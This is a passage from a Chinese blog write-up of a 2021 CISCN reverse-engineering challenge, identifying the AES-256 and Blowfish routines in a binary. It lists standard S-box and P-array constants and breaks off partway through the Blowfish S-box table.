<span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>, <span class="comment">// 5</span></span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>, <span class="comment">// 6</span></span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>, <span class="comment">// 7</span></span><br><span class="line"><span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="comment">// 8</span></span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>, <span class="comment">// 9</span></span><br><span class="line"><span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>, <span class="comment">// a</span></span><br><span class="line"><span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>, <span class="comment">// b</span></span><br><span class="line"><span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="comment">// c</span></span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>, <span class="comment">// d</span></span><br><span class="line"><span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>, <span class="comment">// e</span></span><br><span class="line"><span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>&#125;;<span class="comment">// f</span></span><br></pre></td></tr></table></figure><p>这里选择的是AES256，所以有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0x91u, 0x20u, (__int64)&amp;v6 + 4)</span></span><br><span class="line">AES256(text=<span class="string">&#x27;!!Successfully!!&#x27;</span>,key=STRING[<span class="number">12</span>:<span class="number">44</span>])==[<span class="number">0xD1</span>, <span class="number">0x1F</span>, <span class="number">0xA5</span>, <span class="number">0x6A</span>, <span class="number">0xCE</span>, <span class="number">0x96</span>, <span class="number">0x26</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xD3</span>, <span class="number">0xFC</span>, <span class="number">0x60</span>, <span class="number">0xF7</span>, <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0xD2</span>]</span><br></pre></td></tr></table></figure><h3 id="对称密码-Blowfish"><a href="#对称密码-Blowfish" class="headerlink" title="[对称密码] Blowfish"></a>[对称密码] Blowfish</h3><blockquote><p>具体实现：<a href="https://cloud.tencent.com/developer/article/1836650">BlowFish加解密原理与代码实现 - 云+社区 - 腾讯云</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0xACu</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711111407353.png"></p><p>在<code>sub_4012E0() -&gt; sub_40BCD0()</code>里可以看到两个<code>memcpy()</code>的地方用到了关键常量P盒<code>ORIG_P</code>和S盒<code>ORIG_S</code>：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711174736230.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> ORIG_P[<span class="number">16</span> + <span class="number">2</span>] = &#123;</span><br><span class="line">        <span class="number">0x243F6A88</span>L, <span class="number">0x85A308D3</span>L, <span class="number">0x13198A2E</span>L, <span class="number">0x03707344</span>L,</span><br><span class="line">        <span class="number">0xA4093822</span>L, <span class="number">0x299F31D0</span>L, <span class="number">0x082EFA98</span>L, <span class="number">0xEC4E6C89</span>L,</span><br><span class="line">        <span class="number">0x452821E6</span>L, <span class="number">0x38D01377</span>L, <span class="number">0xBE5466CF</span>L, <span class="number">0x34E90C6C</span>L,</span><br><span class="line">        <span class="number">0xC0AC29B7</span>L, <span class="number">0xC97C50DD</span>L, <span class="number">0x3F84D5B5</span>L, <span class="number">0xB5470917</span>L,</span><br><span class="line">        <span class="number">0x9216D5D9</span>L, <span class="number">0x8979FB1B</span>L</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> ORIG_S[<span class="number">4</span>][<span class="number">256</span>] = &#123;</span><br><span class="line">    &#123;   <span class="number">0xD1310BA6</span>L, <span class="number">0x98DFB5AC</span>L, <span class="number">0x2FFD72DB</span>L, <span class="number">0xD01ADFB7</span>L,</span><br><span class="line">        <span class="number">0xB8E1AFED</span>L, <span class="number">0x6A267E96</span>L, <span class="number">0xBA7C9045</span>L, <span class="number">0xF12C7F99</span>L,</span><br><span class="line">        <span class="number">0x24A19947</span>L, <span class="number">0xB3916CF7</span>L, <span class="number">0x0801F2E2</span>L, <span class="number">0x858EFC16</span>L,</span><br><span class="line">        <span class="number">0x636920D8</span>L, <span class="number">0x71574E69</span>L, <span class="number">0xA458FEA3</span>L, <span class="number">0xF4933D7E</span>L,</span><br><span class="line">        <span class="number">0x0D95748F</span>L, <span class="number">0x728EB658</span>L, <span class="number">0x718BCD58</span>L, <span class="number">0x82154AEE</span>L,</span><br><span class="line">        <span class="number">0x7B54A41D</span>L, <span class="number">0xC25A59B5</span>L, <span class="number">0x9C30D539</span>L, <span class="number">0x2AF26013</span>L,</span><br><span class="line">        <span class="number">0xC5D1B023</span>L, <span class="number">0x286085F0</span>L, <span class="number">0xCA417918</span>L, <span class="number">0xB8DB38EF</span>L,</span><br><span class="line">        <span class="number">0x8E79DCB0</span>L, <span class="number">0x603A180E</span>L, <span class="number">0x6C9E0E8B</span>L, <span class="number">0xB01E8A3E</span>L,</span><br><span class="line">        <span class="number">0xD71577C1</span>L, <span class="number">0xBD314B27</span>L, <span class="number">0x78AF2FDA</span>L, <span class="number">0x55605C60</span>L,</span><br><span class="line">        <span class="number">0xE65525F3</span>L, <span class="number">0xAA55AB94</span>L, <span class="number">0x57489862</span>L, <span class="number">0x63E81440</span>L,</span><br><span class="line">        <span class="number">0x55CA396A</span>L, <span class="number">0x2AAB10B6</span>L, <span class="number">0xB4CC5C34</span>L, <span class="number">0x1141E8CE</span>L,</span><br><span class="line">        <span class="number">0xA15486AF</span>L, <span class="number">0x7C72E993</span>L, <span class="number">0xB3EE1411</span>L, <span class="number">0x636FBC2A</span>L,</span><br><span class="line">        <span class="number">0x2BA9C55D</span>L, <span class="number">0x741831F6</span>L, <span class="number">0xCE5C3E16</span>L, <span class="number">0x9B87931E</span>L,</span><br><span class="line">        <span class="number">0xAFD6BA33</span>L, <span class="number">0x6C24CF5C</span>L, <span class="number">0x7A325381</span>L, <span class="number">0x28958677</span>L,</span><br><span class="line">        <span class="number">0x3B8F4898</span>L, <span class="number">0x6B4BB9AF</span>L, <span class="number">0xC4BFE81B</span>L, <span class="number">0x66282193</span>L,</span><br><span class="line">        <span class="number">0x61D809CC</span>L, <span class="number">0xFB21A991</span>L, <span class="number">0x487CAC60</span>L, <span class="number">0x5DEC8032</span>L,</span><br><span class="line">        <span class="number">0xEF845D5D</span>L, <span class="number">0xE98575B1</span>L, <span class="number">0xDC262302</span>L, <span class="number">0xEB651B88</span>L,</span><br><span class="line">        <span class="number">0x23893E81</span>L, <span class="number">0xD396ACC5</span>L, <span class="number">0x0F6D6FF3</span>L, <span class="number">0x83F44239</span>L,</span><br><span class="line">        <span class="number">0x2E0B4482</span>L, <span class="number">0xA4842004</span>L, <span class="number">0x69C8F04A</span>L, <span class="number">0x9E1F9B5E</span>L,</span><br><span class="line">        <span class="number">0x21C66842</span>L, <span class="number">0xF6E96C9A</span>L, <span class="number">0x670C9C61</span>L, <span class="number">0xABD388F0</span>L,</span><br><span class="line">        <span class="number">0x6A51A0D2</span>L, <span class="number">0xD8542F68</span>L, <span class="number">0x960FA728</span>L, <span class="number">0xAB5133A3</span>L,</span><br><span class="line">        <span class="number">0x6EEF0B6C</span>L, <span class="number">0x137A3BE4</span>L, <span class="number">0xBA3BF050</span>L, <span class="number">0x7EFB2A98</span>L,</span><br><span class="line">        <span class="number">0xA1F1651D</span>L, <span class="number">0x39AF0176</span>L, <span class="number">0x66CA593E</span>L, <span class="number">0x82430E88</span>L,</span><br><span class="line">        <span class="number">0x8CEE8619</span>L, <span class="number">0x456F9FB4</span>L, <span class="number">0x7D84A5C3</span>L, <span class="number">0x3B8B5EBE</span>L,</span><br><span class="line">        <span class="number">0xE06F75D8</span>L, <span class="number">0x85C12073</span>L, <span class="number">0x401A449F</span>L, <span class="number">0x56C16AA6</span>L,</span><br><span class="line">        <span class="number">0x4ED3AA62</span>L, <span class="number">0x363F7706</span>L, <span class="number">0x1BFEDF72</span>L, <span class="number">0x429B023D</span>L,</span><br><span class="line">        <span class="number">0x37D0D724</span>L, <span class="number">0xD00A1248</span>L, <span class="number">0xDB0FEAD3</span>L, <span class="number">0x49F1C09B</span>L,</span><br><span class="line">        <span class="number">0x075372C9</span>L, <span class="number">0x80991B7B</span>L, <span class="number">0x25D479D8</span>L, <span class="number">0xF6E8DEF7</span>L,</span><br><span class="line">        <span class="number">0xE3FE501A</span>L, <span class="number">0xB6794C3B</span>L, <span class="number">0x976CE0BD</span>L, <span class="number">0x04C006BA</span>L,</span><br><span class="line">        <span class="number">0xC1A94FB6</span>L, <span class="number">0x409F60C4</span>L, <span class="number">0x5E5C9EC2</span>L, <span class="number">0x196A2463</span>L,</span><br><span class="line">        <span class="number">0x68FB6FAF</span>L, <span class="number">0x3E6C53B5</span>L, <span class="number">0x1339B2EB</span>L, <span class="number">0x3B52EC6F</span>L,</span><br><span class="line">        <span class="number">0x6DFC511F</span>L, <span class="number">0x9B30952C</span>L, <span class="number">0xCC814544</span>L, <span class="number">0xAF5EBD09</span>L,</span><br><span class="line">        <span class="number">0xBEE3D004</span>L, <span class="number">0xDE334AFD</span>L, <span class="number">0x660F2807</span>L, <span class="number">0x192E4BB3</span>L,</span><br><span class="line">        <span class="number">0xC0CBA857</span>L, <span class="number">0x45C8740F</span>L, <span class="number">0xD20B5F39</span>L, <span class="number">0xB9D3FBDB</span>L,</span><br><span class="line">        <span class="number">0x5579C0BD</span>L, <span class="number">0x1A60320A</span>L, <span class="number">0xD6A100C6</span>L, <span class="number">0x402C7279</span>L,</span><br><span class="line">        <span class="number">0x679F25FE</span>L, <span class="number">0xFB1FA3CC</span>L, <span class="number">0x8EA5E9F8</span>L, <span class="number">0xDB3222F8</span>L,</span><br><span class="line">        <span class="number">0x3C7516DF</span>L, <span class="number">0xFD616B15</span>L, <span class="number">0x2F501EC8</span>L, <span class="number">0xAD0552AB</span>L,</span><br><span class="line">        <span class="number">0x323DB5FA</span>L, <span class="number">0xFD238760</span>L, <span class="number">0x53317B48</span>L, <span class="number">0x3E00DF82</span>L,</span><br><span class="line">        <span class="number">0x9E5C57BB</span>L, <span class="number">0xCA6F8CA0</span>L, <span class="number">0x1A87562E</span>L, <span class="number">0xDF1769DB</span>L,</span><br><span class="line">        <span class="number">0xD542A8F6</span>L, <span class="number">0x287EFFC3</span>L, <span class="number">0xAC6732C6</span>L, <span class="number">0x8C4F5573</span>L,</span><br><span class="line">        <span class="number">0x695B27B0</span>L, <span class="number">0xBBCA58C8</span>L, <span class="number">0xE1FFA35D</span>L, <span class="number">0xB8F011A0</span>L,</span><br><span class="line">        <span class="number">0x10FA3D98</span>L, <span class="number">0xFD2183B8</span>L, <span class="number">0x4AFCB56C</span>L, <span class="number">0x2DD1D35B</span>L,</span><br><span class="line">        <span class="number">0x9A53E479</span>L, <span class="number">0xB6F84565</span>L, <span class="number">0xD28E49BC</span>L, <span class="number">0x4BFB9790</span>L,</span><br><span class="line">        <span class="number">0xE1DDF2DA</span>L, <span class="number">0xA4CB7E33</span>L, <span class="number">0x62FB1341</span>L, <span class="number">0xCEE4C6E8</span>L,</span><br><span class="line">        <span class="number">0xEF20CADA</span>L, <span class="number">0x36774C01</span>L, <span class="number">0xD07E9EFE</span>L, <span class="number">0x2BF11FB4</span>L,</span><br><span class="line">        <span class="number">0x95DBDA4D</span>L, <span class="number">0xAE909198</span>L, <span class="number">0xEAAD8E71</span>L, <span class="number">0x6B93D5A0</span>L,</span><br><span class="line">        <span class="number">0xD08ED1D0</span>L, <span class="number">0xAFC725E0</span>L, <span class="number">0x8E3C5B2F</span>L, <span class="number">0x8E7594B7</span>L,</span><br><span class="line">        <span class="number">0x8FF6E2FB</span>L, <span class="number">0xF2122B64</span>L, <span class="number">0x8888B812</span>L, <span class="number">0x900DF01C</span>L,</span><br><span class="line">        <span class="number">0x4FAD5EA0</span>L, <span class="number">0x688FC31C</span>L, <span class="number">0xD1CFF191</span>L, <span class="number">0xB3A8C1AD</span>L,</span><br><span class="line">        <span class="number">0x2F2F2218</span>L, <span class="number">0xBE0E1777</span>L, <span class="number">0xEA752DFE</span>L, <span class="number">0x8B021FA1</span>L,</span><br><span class="line">        <span class="number">0xE5A0CC0F</span>L, <span class="number">0xB56F74E8</span>L, <span class="number">0x18ACF3D6</span>L, <span class="number">0xCE89E299</span>L,</span><br><span class="line">        <span class="number">0xB4A84FE0</span>L, <span class="number">0xFD13E0B7</span>L, <span class="number">0x7CC43B81</span>L, <span class="number">0xD2ADA8D9</span>L,</span><br><span class="line">        <span class="number">0x165FA266</span>L, <span class="number">0x80957705</span>L, <span class="number">0x93CC7314</span>L, <span class="number">0x211A1477</span>L,</span><br><span class="line">        <span class="number">0xE6AD2065</span>L, <span class="number">0x77B5FA86</span>L, <span class="number">0xC75442F5</span>L, <span class="number">0xFB9D35CF</span>L,</span><br><span class="line">        <span class="number">0xEBCDAF0C</span>L, <span class="number">0x7B3E89A0</span>L, <span class="number">0xD6411BD3</span>L, <span class="number">0xAE1E7E49</span>L,</span><br><span class="line">        <span class="number">0x00250E2D</span>L, <span class="number">0x2071B35E</span>L, <span class="number">0x226800BB</span>L, <span class="number">0x57B8E0AF</span>L,</span><br><span class="line">        <span class="number">0x2464369B</span>L, <span class="number">0xF009B91E</span>L, <span class="number">0x5563911D</span>L, <span class="number">0x59DFA6AA</span>L,</span><br><span class="line">        <span class="number">0x78C14389</span>L, <span class="number">0xD95A537F</span>L, <span class="number">0x207D5BA2</span>L, <span class="number">0x02E5B9C5</span>L,</span><br><span class="line">        <span class="number">0x83260376</span>L, <span class="number">0x6295CFA9</span>L, <span class="number">0x11C81968</span>L, <span class="number">0x4E734A41</span>L,</span><br><span class="line">        <span class="number">0xB3472DCA</span>L, <span class="number">0x7B14A94A</span>L, <span class="number">0x1B510052</span>L, <span class="number">0x9A532915</span>L,</span><br><span class="line">        <span class="number">0xD60F573F</span>L, <span class="number">0xBC9BC6E4</span>L, <span class="number">0x2B60A476</span>L, <span class="number">0x81E67400</span>L,</span><br><span class="line">        <span class="number">0x08BA6FB5</span>L, <span class="number">0x571BE91F</span>L, <span class="number">0xF296EC6B</span>L, <span class="number">0x2A0DD915</span>L,</span><br><span class="line">        <span class="number">0xB6636521</span>L, <span class="number">0xE7B9F9B6</span>L, <span class="number">0xFF34052E</span>L, <span class="number">0xC5855664</span>L,</span><br><span class="line">        <span class="number">0x53B02D5D</span>L, <span class="number">0xA99F8FA1</span>L, <span class="number">0x08BA4799</span>L, <span class="number">0x6E85076A</span>L   &#125;,</span><br><span class="line">    &#123;   <span class="number">0x4B7A70E9</span>L, <span class="number">0xB5B32944</span>L, <span class="number">0xDB75092E</span>L, <span class="number">0xC4192623</span>L,</span><br><span class="line">        <span class="number">0xAD6EA6B0</span>L, <span class="number">0x49A7DF7D</span>L, <span class="number">0x9CEE60B8</span>L, <span class="number">0x8FEDB266</span>L,</span><br><span class="line">        <span class="number">0xECAA8C71</span>L, <span class="number">0x699A17FF</span>L, <span class="number">0x5664526C</span>L, <span class="number">0xC2B19EE1</span>L,</span><br><span class="line">        <span class="number">0x193602A5</span>L, <span class="number">0x75094C29</span>L, <span class="number">0xA0591340</span>L, <span class="number">0xE4183A3E</span>L,</span><br><span class="line">        <span class="number">0x3F54989A</span>L, <span class="number">0x5B429D65</span>L, <span class="number">0x6B8FE4D6</span>L, <span class="number">0x99F73FD6</span>L,</span><br><span class="line">        <span class="number">0xA1D29C07</span>L, <span class="number">0xEFE830F5</span>L, <span class="number">0x4D2D38E6</span>L, <span class="number">0xF0255DC1</span>L,</span><br><span class="line">        <span class="number">0x4CDD2086</span>L, <span class="number">0x8470EB26</span>L, <span class="number">0x6382E9C6</span>L, <span class="number">0x021ECC5E</span>L,</span><br><span class="line">        <span class="number">0x09686B3F</span>L, <span class="number">0x3EBAEFC9</span>L, <span class="number">0x3C971814</span>L, <span class="number">0x6B6A70A1</span>L,</span><br><span class="line">        <span class="number">0x687F3584</span>L, <span class="number">0x52A0E286</span>L, <span class="number">0xB79C5305</span>L, <span class="number">0xAA500737</span>L,</span><br><span class="line">        <span class="number">0x3E07841C</span>L, <span class="number">0x7FDEAE5C</span>L, <span class="number">0x8E7D44EC</span>L, <span class="number">0x5716F2B8</span>L,</span><br><span class="line">        <span class="number">0xB03ADA37</span>L, <span class="number">0xF0500C0D</span>L, <span class="number">0xF01C1F04</span>L, <span class="number">0x0200B3FF</span>L,</span><br><span class="line">        <span class="number">0xAE0CF51A</span>L, <span class="number">0x3CB574B2</span>L, <span class="number">0x25837A58</span>L, <span class="number">0xDC0921BD</span>L,</span><br><span class="line">        <span class="number">0xD19113F9</span>L, <span class="number">0x7CA92FF6</span>L, <span class="number">0x94324773</span>L, <span class="number">0x22F54701</span>L,</span><br><span class="line">        <span class="number">0x3AE5E581</span>L, <span class="number">0x37C2DADC</span>L, <span class="number">0xC8B57634</span>L, <span class="number">0x9AF3DDA7</span>L,</span><br><span class="line">        <span class="number">0xA9446146</span>L, <span class="number">0x0FD0030E</span>L, <span class="number">0xECC8C73E</span>L, <span class="number">0xA4751E41</span>L,</span><br><span class="line">        <span class="number">0xE238CD99</span>L, <span class="number">0x3BEA0E2F</span>L, <span class="number">0x3280BBA1</span>L, <span class="number">0x183EB331</span>L,</span><br><span class="line">        <span class="number">0x4E548B38</span>L, <span class="number">0x4F6DB908</span>L, <span class="number">0x6F420D03</span>L, <span class="number">0xF60A04BF</span>L,</span><br><span class="line">        <span class="number">0x2CB81290</span>L, <span class="number">0x24977C79</span>L, <span class="number">0x5679B072</span>L, <span class="number">0xBCAF89AF</span>L,</span><br><span class="line">        <span class="number">0xDE9A771F</span>L, <span class="number">0xD9930810</span>L, <span class="number">0xB38BAE12</span>L, <span class="number">0xDCCF3F2E</span>L,</span><br><span class="line">        <span class="number">0x5512721F</span>L, <span class="number">0x2E6B7124</span>L, <span class="number">0x501ADDE6</span>L, <span class="number">0x9F84CD87</span>L,</span><br><span class="line">        <span class="number">0x7A584718</span>L, <span class="number">0x7408DA17</span>L, <span class="number">0xBC9F9ABC</span>L, <span class="number">0xE94B7D8C</span>L,</span><br><span class="line">        <span class="number">0xEC7AEC3A</span>L, <span class="number">0xDB851DFA</span>L, <span class="number">0x63094366</span>L, <span class="number">0xC464C3D2</span>L,</span><br><span class="line">        <span class="number">0xEF1C1847</span>L, <span class="number">0x3215D908</span>L, <span class="number">0xDD433B37</span>L, <span class="number">0x24C2BA16</span>L,</span><br><span class="line">        <span class="number">0x12A14D43</span>L, <span class="number">0x2A65C451</span>L, <span class="number">0x50940002</span>L, <span class="number">0x133AE4DD</span>L,</span><br><span class="line">        <span class="number">0x71DFF89E</span>L, <span class="number">0x10314E55</span>L, <span class="number">0x81AC77D6</span>L, <span class="number">0x5F11199B</span>L,</span><br><span class="line">        <span class="number">0x043556F1</span>L, <span class="number">0xD7A3C76B</span>L, <span class="number">0x3C11183B</span>L, <span class="number">0x5924A509</span>L,</span><br><span class="line">        <span class="number">0xF28FE6ED</span>L, <span class="number">0x97F1FBFA</span>L, <span class="number">0x9EBABF2C</span>L, <span class="number">0x1E153C6E</span>L,</span><br><span class="line">        <span class="number">0x86E34570</span>L, <span class="number">0xEAE96FB1</span>L, <span class="number">0x860E5E0A</span>L, <span class="number">0x5A3E2AB3</span>L,</span><br><span class="line">        <span class="number">0x771FE71C</span>L, <span class="number">0x4E3D06FA</span>L, <span class="number">0x2965DCB9</span>L, <span class="number">0x99E71D0F</span>L,</span><br><span class="line">        <span class="number">0x803E89D6</span>L, <span class="number">0x5266C825</span>L, <span class="number">0x2E4CC978</span>L, <span class="number">0x9C10B36A</span>L,</span><br><span class="line">        <span class="number">0xC6150EBA</span>L, <span class="number">0x94E2EA78</span>L, <span class="number">0xA5FC3C53</span>L, <span class="number">0x1E0A2DF4</span>L,</span><br><span class="line">        <span 